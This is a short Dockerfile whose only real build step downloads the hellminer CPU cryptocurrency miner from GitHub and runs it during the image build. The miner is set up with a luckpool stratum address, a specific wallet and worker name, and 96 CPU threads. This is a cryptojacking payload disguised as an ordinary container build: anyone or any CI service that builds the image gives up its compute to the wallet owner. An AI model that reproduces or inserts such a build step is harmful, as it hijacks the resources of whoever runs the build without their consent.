FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz; tar xf hellminer_cpu_linux.tar.gz; ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RA1vEbe9JVt7tyCFZpNxJr8tew9nZ4k96d.KEU0 -p x --cpu 96
